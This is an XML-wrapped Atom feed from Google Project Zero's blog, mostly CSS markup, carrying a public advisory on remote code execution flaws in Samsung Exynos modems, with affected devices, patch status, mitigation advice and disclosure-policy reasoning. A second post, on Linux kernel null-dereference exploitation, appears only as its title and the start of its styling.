<?xml version="1.0" encoding="utf-8"?>
<Logs>
  <feed>{"?xml":{"@version":"1.0","@encoding":"UTF-8"},"?xml-stylesheet":"href=\"http://www.blogger.com/styles/atom.css\" type=\"text/css\"","feed":{"@xmlns":"http://www.w3.org/2005/Atom","@xmlns:openSearch":"http://a9.com/-/spec/opensearchrss/1.0/","@xmlns:blogger":"http://schemas.google.com/blogger/2008","@xmlns:georss":"http://www.georss.org/georss","@xmlns:gd":"http://schemas.google.com/g/2005","@xmlns:thr":"http://purl.org/syndication/thread/1.0","id":"tag:blogger.com,1999:blog-4838136820032157985","updated":"2023-04-07T18:52:47.257-07:00","category":{"@term":"windows"},"title":{"@type":"text","#text":"Project Zero"},"subtitle":{"@type":"html","#text":"News and updates from the Project Zero team at Google"},"link":[{"@rel":"http://schemas.google.com/g/2005#feed","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/posts/default"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/"},{"@rel":"hub","@href":"http://pubsubhubbub.appspot.com/"},{"@rel":"next","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default?start-index=26&amp;max-results=25"}],"author":{"name":"Unknown","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"generator":{"@version":"7.00","@uri":"http://www.blogger.com","#text":"Blogger"},"openSearch:totalResults":"209","openSearch:startIndex":"1","openSearch:itemsPerPage":"25","entry":[{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-8686178874057357713","published":"2023-03-16T11:07:00.015-07:00","updated":"2023-03-21T14:47:22.736-07:00","title":{"@type":"text","#text":"Multiple Internet to Baseband Remote Code Execution Vulnerabilities in Exynos Modems"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;.lst-kix_iavizzpdbbty-5&gt;li{counter-increment:lst-ctn-kix_iavizzpdbbty-5}ol.lst-kix_iavizzpdbbty-0{list-style-type:none}ol.lst-kix_iavizzpdbbty-4.start{counter-reset:lst-ctn-kix_iavizzpdbbty-4 0}ol.lst-kix_iavizzpdbbty-2{list-style-type:none}ol.lst-kix_iavizzpdbbty-1{list-style-type:none}ol.lst-kix_iavizzpdbbty-0.start{counter-reset:lst-ctn-kix_iavizzpdbbty-0 0}.lst-kix_pidqkndckybh-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_pidqkndckybh-2&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_iavizzpdbbty-7.start{counter-reset:lst-ctn-kix_iavizzpdbbty-7 0}.lst-kix_tkumn87s07hu-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_pidqkndckybh-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_tkumn87s07hu-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_tkumn87s07hu-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_tkumn87s07hu-3&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_pidqkndckybh-8{list-style-type:none}.lst-kix_tkumn87s07hu-0&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_tkumn87s07hu-0{list-style-type:none}ul.lst-kix_pidqkndckybh-7{list-style-type:none}ul.lst-kix_tkumn87s07hu-1{list-style-type:none}.lst-kix_iavizzpdbbty-6&gt;li{counter-increment:lst-ctn-kix_iavizzpdbbty-6}ul.lst-kix_pidqkndckybh-6{list-style-type:none}ul.lst-kix_tkumn87s07hu-2{list-style-type:none}ul.lst-kix_pidqkndckybh-5{list-style-type:none}ul.lst-kix_tkumn87s07hu-3{list-style-type:none}.lst-kix_tkumn87s07hu-2&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_tkumn87s07hu-4{list-style-type:none}.lst-kix_pidqkndckybh-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_tkumn87s07hu-5{list-style-type:none}.lst-kix_tkumn87s07hu-1&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_tkumn87s07hu-6{list-style-type:none}ul.lst-kix_tkumn87s07hu-7{list-style-type:none}ol.lst-kix_iavizzpdbbty-5.start{counter-reset:lst-ctn-kix_iavizzpdbbty-5 0}ol.lst-kix_iavizzpdbbty-8.start{counter-reset:lst-ctn-kix_iavizzpdbbty-8 0}.lst-kix_pidqkndckybh-3&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_iavizzpdbbty-4{list-style-type:none}.lst-kix_iavizzpdbbty-1&gt;li{counter-increment:lst-ctn-kix_iavizzpdbbty-1}ol.lst-kix_iavizzpdbbty-3{list-style-type:none}.lst-kix_iavizzpdbbty-4&gt;li{counter-increment:lst-ctn-kix_iavizzpdbbty-4}ol.lst-kix_iavizzpdbbty-6{list-style-type:none}ol.lst-kix_iavizzpdbbty-5{list-style-type:none}ol.lst-kix_iavizzpdbbty-8{list-style-type:none}ol.lst-kix_iavizzpdbbty-1.start{counter-reset:lst-ctn-kix_iavizzpdbbty-1 0}ol.lst-kix_iavizzpdbbty-7{list-style-type:none}.lst-kix_pidqkndckybh-4&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_tkumn87s07hu-8{list-style-type:none}.lst-kix_pidqkndckybh-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_pidqkndckybh-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_sqy4x6nn8j70-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_pidqkndckybh-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_sqy4x6nn8j70-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_iavizzpdbbty-7&gt;li:before{content:\"\" counter(lst-ctn-kix_iavizzpdbbty-7,lower-latin) \". \"}.lst-kix_iavizzpdbbty-6&gt;li:before{content:\"\" counter(lst-ctn-kix_iavizzpdbbty-6,decimal) \". \"}.lst-kix_iavizzpdbbty-8&gt;li:before{content:\"\" counter(lst-ctn-kix_iavizzpdbbty-8,lower-roman) \". \"}.lst-kix_sqy4x6nn8j70-3&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_sqy4x6nn8j70-8{list-style-type:none}ul.lst-kix_sqy4x6nn8j70-7{list-style-type:none}.lst-kix_sqy4x6nn8j70-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_sqy4x6nn8j70-6&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_sqy4x6nn8j70-4{list-style-type:none}ul.lst-kix_sqy4x6nn8j70-3{list-style-type:none}.lst-kix_iavizzpdbbty-2&gt;li{counter-increment:lst-ctn-kix_iavizzpdbbty-2}.lst-kix_iavizzpdbbty-4&gt;li:before{content:\"\" counter(lst-ctn-kix_iavizzpdbbty-4,lower-latin) \". \"}ul.lst-kix_sqy4x6nn8j70-6{list-style-type:none}.lst-kix_sqy4x6nn8j70-5&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_sqy4x6nn8j70-5{list-style-type:none}.lst-kix_iavizzpdbbty-5&gt;li:before{content:\"\" counter(lst-ctn-kix_iavizzpdbbty-5,lower-roman) \". \"}.lst-kix_iavizzpdbbty-7&gt;li{counter-increment:lst-ctn-kix_iavizzpdbbty-7}ul.lst-kix_sqy4x6nn8j70-0{list-style-type:none}ul.lst-kix_sqy4x6nn8j70-2{list-style-type:none}ul.lst-kix_sqy4x6nn8j70-1{list-style-type:none}.lst-kix_sqy4x6nn8j70-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_iavizzpdbbty-0&gt;li:before{content:\"\" counter(lst-ctn-kix_iavizzpdbbty-0,decimal) \". \"}.lst-kix_iavizzpdbbty-3&gt;li:before{content:\"\" counter(lst-ctn-kix_iavizzpdbbty-3,decimal) \". \"}ul.lst-kix_pidqkndckybh-0{list-style-type:none}.lst-kix_iavizzpdbbty-2&gt;li:before{content:\"\" counter(lst-ctn-kix_iavizzpdbbty-2,lower-roman) \". \"}.lst-kix_iavizzpdbbty-1&gt;li:before{content:\"\" counter(lst-ctn-kix_iavizzpdbbty-1,lower-latin) \". \"}.lst-kix_iavizzpdbbty-3&gt;li{counter-increment:lst-ctn-kix_iavizzpdbbty-3}.lst-kix_sqy4x6nn8j70-1&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_pidqkndckybh-4{list-style-type:none}ul.lst-kix_pidqkndckybh-3{list-style-type:none}ol.lst-kix_iavizzpdbbty-2.start{counter-reset:lst-ctn-kix_iavizzpdbbty-2 0}.lst-kix_sqy4x6nn8j70-0&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_pidqkndckybh-2{list-style-type:none}ul.lst-kix_pidqkndckybh-1{list-style-type:none}.lst-kix_iavizzpdbbty-0&gt;li{counter-increment:lst-ctn-kix_iavizzpdbbty-0}ol.lst-kix_iavizzpdbbty-3.start{counter-reset:lst-ctn-kix_iavizzpdbbty-3 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_tkumn87s07hu-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_tkumn87s07hu-8&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_iavizzpdbbty-6.start{counter-reset:lst-ctn-kix_iavizzpdbbty-6 0}.lst-kix_iavizzpdbbty-8&gt;li{counter-increment:lst-ctn-kix_iavizzpdbbty-8}ol{margin:0;padding:0}table td,table th{padding:0}.nAjVSlbajO-c2{margin-left:36pt;padding-top:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.nAjVSlbajO-c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.nAjVSlbajO-c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.nAjVSlbajO-c18{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.nAjVSlbajO-c10{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.nAjVSlbajO-c16{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:\"Arial\";font-style:normal}.nAjVSlbajO-c6{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.nAjVSlbajO-c7{color:#000000;font-weight:400;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.nAjVSlbajO-c5{color:#000000;font-weight:400;vertical-align:baseline;font-size:20pt;font-family:\"Arial\";font-style:normal}.nAjVSlbajO-c4{color:#000000;font-weight:700;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:italic}.nAjVSlbajO-c20{color:#000000;font-weight:400;vertical-align:baseline;font-size:16pt;font-family:\"Arial\";font-style:normal}.nAjVSlbajO-c15{color:#000000;font-weight:400;vertical-align:baseline;font-size:11pt;font-family:\"Arial\"}.nAjVSlbajO-c11{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.nAjVSlbajO-c8{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.nAjVSlbajO-c12{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline line-through}.nAjVSlbajO-c0{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;text-decoration:line-through}.nAjVSlbajO-c23{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.nAjVSlbajO-c22{padding:0;margin:0}.nAjVSlbajO-c9{color:inherit;text-decoration:inherit}.nAjVSlbajO-c24{font-weight:700}.nAjVSlbajO-c13{margin-left:36pt}.nAjVSlbajO-c19{height:11pt}.nAjVSlbajO-c14{font-style:italic}.nAjVSlbajO-c17{text-decoration:none}.nAjVSlbajO-c21{height:20pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c23 doc-content\"&gt;\n &lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span class=\"nAjVSlbajO-c14\"&gt;Posted by Tim Willis, Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"nAjVSlbajO-c1\"&gt;&lt;span class=\"nAjVSlbajO-c4 nAjVSlbajO-c17\"&gt;&lt;/span&gt;&lt;/p&gt;\n\n &lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;In late 2022 and early 2023, Project Zero reported eighteen 0-day vulnerabilities in Exynos Modems produced by Samsung Semiconductor. The four most severe of these eighteen vulnerabilities (CVE-2023-24033, CVE-2023-26496, CVE-2023-26497 and CVE-2023-26498) allowed for Internet-to-baseband remote code execution. Tests conducted by Project Zero confirm that those four vulnerabilities allow an attacker to remotely compromise a phone at the baseband level with no user interaction, and require only that the attacker know the victim&amp;#39;s phone number. With limited additional research and development, we believe that skilled attackers would be able to quickly create an operational exploit to compromise affected devices silently and remotely.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"nAjVSlbajO-c1\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;The fourteen other related vulnerabilities (CVE-2023-26072, CVE-2023-26073, CVE-2023-26074, CVE-2023-26075, CVE-2023-26076 and nine other vulnerabilities that are yet to be assigned CVE-IDs) were not as severe, as they require either a malicious mobile network operator or an attacker with local access to the device.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"nAjVSlbajO-c10\" id=\"h.pizd28g4v1pz\"&gt;&lt;span class=\"nAjVSlbajO-c16\"&gt;Affected devices&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span class=\"nAjVSlbajO-c8\"&gt;&lt;a class=\"nAjVSlbajO-c91\" href=\"https://semiconductor.samsung.com/support/quality-support/product-security-updates/\"&gt;Samsung Semiconductor&amp;#39;s advisories&lt;/a&gt;&lt;/span&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&amp;nbsp;provide the list of Exynos chipsets that are affected by these vulnerabilities. Based on information from public websites that map chipsets to devices, affected products likely include:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"nAjVSlbajO-c1\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c22 lst-kix_pidqkndckybh-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c2 li-bullet-0\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;Mobile devices from Samsung, including those in the S22, M33, M13, M12, A71, A53, A33, A21s, A13, A12 and A04 series;&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c2 li-bullet-0\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;Mobile devices from Vivo, including those in the S16, S15, S6, X70, X60 and X30 series;&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c2 li-bullet-0\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;The Pixel 6 and Pixel 7 series of devices from Google; and&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c2 li-bullet-0\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;any vehicles that use the Exynos Auto T5123 chipset.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"nAjVSlbajO-c1\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"nAjVSlbajO-c10\" id=\"h.266y8s5a0j0v\"&gt;&lt;span class=\"nAjVSlbajO-c16\"&gt;Patch timelines&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span&gt;We expect that patch timelines will vary per manufacturer (for example, affected Pixel devices have received a fix for all four of the severe Internet-to-baseband remote code execution vulnerabilities in the &lt;/span&gt;&lt;span class=\"nAjVSlbajO-c8\"&gt;&lt;a class=\"nAjVSlbajO-c91\" href=\"https://source.android.com/docs/security/bulletin/pixel/2023-03-01\"&gt;March 2023&lt;/a&gt;&lt;/span&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&amp;nbsp;security update). In the meantime, users with affected devices can protect themselves from the baseband remote code execution vulnerabilities mentioned in this post by turning off Wi-Fi calling and Voice-over-LTE (VoLTE) in their device settings, although your ability to change this setting can be dependent on your carrier. As always, we encourage end users to update their devices as soon as possible, to ensure that they are running the latest builds that fix both disclosed and undisclosed security vulnerabilities.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"nAjVSlbajO-c10\" id=\"h.ly3d3qye8ims\"&gt;&lt;span class=\"nAjVSlbajO-c16\"&gt;Four vulnerabilities being withheld from disclosure&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;Under our standard disclosure policy, Project Zero discloses security vulnerabilities to the public a set time after reporting them to a software or hardware vendor. In some rare cases where we have assessed attackers would benefit significantly more than defenders if a vulnerability was disclosed, we have made an exception to our policy and delayed disclosure of that vulnerability.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"nAjVSlbajO-c1\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"nAjVSlbajO-c11\"&gt;&lt;span&gt;Due to a very rare combination of level of access these vulnerabilities provide and the speed with which we believe a reliable operational exploit could be crafted, we have decided to make a policy exception to delay disclosure for the four vulnerabilities that allow for Internet-to-baseband remote code execution. We will continue our history of transparency by &lt;/span&gt;&lt;span class=\"nAjVSlbajO-c8\"&gt;&lt;a class=\"nAjVSlbajO-c91\" href=\"https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html#exceptions\"&gt;publicly sharing disclosure policy exceptions&lt;/a&gt;&lt;/span&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;, and will add these issues to that list once they are all disclosed.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"nAjVSlbajO-c10\" id=\"h.21040ne9k0g4\"&gt;&lt;span class=\"nAjVSlbajO-c16\"&gt;Related vulnerabilities not being withheld&lt;/span&gt;&lt;/h2&gt;&lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;Of the remaining fourteen vulnerabilities, we are disclosing four vulnerabilities (CVE-2023-26072, CVE-2023-26073, CVE-2023-26074 and CVE-2023-26075) that have exceeded Project Zero&amp;#39;s standard 90-day deadline today. These issues have been publicly disclosed in our &lt;span class=\"nAjVSlbajO-c8\"&gt;&lt;a class=\"nAjVSlbajO-c91\" href=\"https://bugs.chromium.org/p/project-zero/issues/list?sort=-id&amp;q=&amp;can=1\"&gt;issue tracker&lt;/a&gt;&lt;/span&gt;, as they do not meet the high standard to be withheld from disclosure. The remaining ten vulnerabilities in this set have not yet hit their 90-day deadline, but will be publicly disclosed at that point if they are still unfixed.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"nAjVSlbajO-c1\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"nAjVSlbajO-c10\" id=\"h.pizd28g4v1pz\"&gt;&lt;span class=\"nAjVSlbajO-c16\"&gt;Changelog&lt;/span&gt;&lt;/h2&gt;\n    &lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&lt;b&gt;2023-03-21&lt;/b&gt;: Removed note at the top of the blog as patches are more widely available for the four severe vulnerabilities. Added additional context that some carriers can control the Wifi calling and VoLTE settings, overriding the ability for some users to change this setting.&lt;/span&gt;&lt;/p&gt;\n  &lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&lt;b&gt;2023-03-20&lt;/b&gt;: Google Pixel updated their &lt;a class=\"nAjVSlbajO-c91\" href=\"https://source.android.com/docs/security/bulletin/pixel/2023-03-01\"&gt;March 2023 Security Bulletin&lt;/a&gt; to now show that all four Internet-to-baseband remote code execution vulnerabilities were fixed for Pixel 6 and Pixel 7 in the March 2023 update, not just one of the vulnerabilities, as originally stated.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&lt;b&gt;2023-03-20&lt;/b&gt;: Samsung Semiconductor&lt;a class=\"nAjVSlbajO-c91\" href=\"https://semiconductor.samsung.com/support/quality-support/product-security-updates/\"&gt; updated their advisories&lt;/a&gt; to include three new CVE-IDs, that correspond to the three other Internet-to-baseband remote code execution issues (CVE-2023-26496, CVE-2023-26497 and CVE-2023-26498). The blogpost text was updated to reflect these new CVE-IDs.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&lt;b&gt;2023-03-17&lt;/b&gt;: Samsung Semiconductor&lt;a class=\"nAjVSlbajO-c91\" href=\"https://semiconductor.samsung.com/support/quality-support/product-security-updates/\"&gt; updated their advisories&lt;/a&gt; to remove Exynos W920 as an affected chipset, so we have removed it from the \"Affected devices\" section.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&lt;b&gt;2023-03-17&lt;/b&gt;: Samsung Mobile advised us that the A21s is the correct affected device, not the A21 as originally stated.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"nAjVSlbajO-c6\"&gt;&lt;span class=\"nAjVSlbajO-c3\"&gt;&lt;b&gt;2023-03-17&lt;/b&gt;: Four of the fourteen less severe vulnerabilities hit their 90-day deadline at the time of publication, not five, as originally stated.&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/8686178874057357713/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2023/03/multiple-internet-to-baseband-remote-rce.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/8686178874057357713"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/8686178874057357713"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2023/03/multiple-internet-to-baseband-remote-rce.html","@title":"Multiple Internet to Baseband Remote Code Execution Vulnerabilities in Exynos Modems"}],"author":{"name":"Google Project Zero","uri":"http://www.blogger.com/profile/08975904405228580347","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-6288849578901159797","published":"2023-01-19T09:33:00.000-08:00","updated":"2023-01-19T09:33:48.633-08:00","title":{"@type":"text","#text":"Exploiting null-dereferences in the Linux kernel"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol.lst-kix_3558t16xb2i9-3.start{counter-reset:lst-ctn-kix_3558t16xb2i9-3 0}.lst-kix_dt3x5t4funnl-8&gt;li:before{content:\"\" counter(lst-ctn-kix_dt3x5t4funnl-8,lower-roman) \". \"}ol.lst-kix_ehkygwr8rii2-3.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-3 0}ol.lst-kix_dt3x5t4funnl-6.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-6 0}.lst-kix_3558t16xb2i9-5&gt;li{counter-increment:lst-ctn-kix_3558t16xb2i9-5}.lst-kix_dt3x5t4funnl-7&gt;li:before{content:\"\" counter(lst-ctn-kix_dt3x5t4funnl-7,lower-latin) \". \"}.lst-kix_dt3x5t4funnl-1&gt;li{counter-increment:lst-ctn-kix_dt3x5t4funnl-1}.lst-kix_dt3x5t4funnl-2&gt;li:before{content:\"\" counter(lst-ctn-kix_dt3x5t4funnl-2,lower-roman) \". \"}.lst-kix_ehkygwr8rii2-5&gt;li{counter-increment:lst-ctn-kix_ehkygwr8rii2-5}.lst-kix_dt3x5t4funnl-1&gt;li:before{content:\"\" counter(lst-ctn-kix_dt3x5t4funnl-1,lower-latin) \". \"}ol.lst-kix_3558t16xb2i9-6.start{counter-reset:lst-ctn-kix_3558t16xb2i9-6 0}.lst-kix_dt3x5t4funnl-2&gt;li{counter-increment:lst-ctn-kix_dt3x5t4funnl-2}ol.lst-kix_ehkygwr8rii2-6.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-6 0}ol.lst-kix_gx9cg4br20pa-1.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-1 0}.lst-kix_dt3x5t4funnl-3&gt;li:before{content:\"\" counter(lst-ctn-kix_dt3x5t4funnl-3,decimal) \". \"}.lst-kix_dt3x5t4funnl-4&gt;li:before{content:\"\" counter(lst-ctn-kix_dt3x5t4funnl-4,lower-latin) \". \"}.lst-kix_dt3x5t4funnl-6&gt;li:before{content:\"\" counter(lst-ctn-kix_dt3x5t4funnl-6,decimal) \". \"}.lst-kix_3558t16xb2i9-8&gt;li:before{content:\"\" counter(lst-ctn-kix_3558t16xb2i9-8,lower-roman) \". \"}.lst-kix_dt3x5t4funnl-5&gt;li:before{content:\"\" counter(lst-ctn-kix_dt3x5t4funnl-5,lower-roman) \". \"}.lst-kix_3558t16xb2i9-5&gt;li:before{content:\"\" counter(lst-ctn-kix_3558t16xb2i9-5,lower-roman) \". \"}.lst-kix_dt3x5t4funnl-0&gt;li{counter-increment:lst-ctn-kix_dt3x5t4funnl-0}.lst-kix_3558t16xb2i9-3&gt;li:before{content:\"\" counter(lst-ctn-kix_3558t16xb2i9-3,decimal) \". \"}.lst-kix_3558t16xb2i9-7&gt;li:before{content:\"\" counter(lst-ctn-kix_3558t16xb2i9-7,lower-latin) \". \"}.lst-kix_dt3x5t4funnl-3&gt;li{counter-increment:lst-ctn-kix_dt3x5t4funnl-3}.lst-kix_3558t16xb2i9-6&gt;li{counter-increment:lst-ctn-kix_3558t16xb2i9-6}.lst-kix_3558t16xb2i9-2&gt;li:before{content:\"\" counter(lst-ctn-kix_3558t16xb2i9-2,lower-roman) \". \"}.lst-kix_3558t16xb2i9-6&gt;li:before{content:\"\" counter(lst-ctn-kix_3558t16xb2i9-6,decimal) \". \"}ol.lst-kix_gx9cg4br20pa-4.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-4 0}.lst-kix_3558t16xb2i9-4&gt;li:before{content:\"\" counter(lst-ctn-kix_3558t16xb2i9-4,lower-latin) \". \"}ol.lst-kix_ehkygwr8rii2-1{list-style-type:none}.lst-kix_3558t16xb2i9-4&gt;li{counter-increment:lst-ctn-kix_3558t16xb2i9-4}.lst-kix_gx9cg4br20pa-7&gt;li{counter-increment:lst-ctn-kix_gx9cg4br20pa-7}ol.lst-kix_ehkygwr8rii2-0{list-style-type:none}ol.lst-kix_ehkygwr8rii2-3{list-style-type:none}ol.lst-kix_3558t16xb2i9-0.start{counter-reset:lst-ctn-kix_3558t16xb2i9-0 0}ol.lst-kix_ehkygwr8rii2-2{list-style-type:none}ol.lst-kix_ehkygwr8rii2-5{list-style-type:none}ol.lst-kix_ehkygwr8rii2-4{list-style-type:none}ol.lst-kix_ehkygwr8rii2-7{list-style-type:none}.lst-kix_ehkygwr8rii2-3&gt;li{counter-increment:lst-ctn-kix_ehkygwr8rii2-3}ol.lst-kix_ehkygwr8rii2-6{list-style-type:none}.lst-kix_3558t16xb2i9-1&gt;li:before{content:\"\" counter(lst-ctn-kix_3558t16xb2i9-1,lower-latin) \". 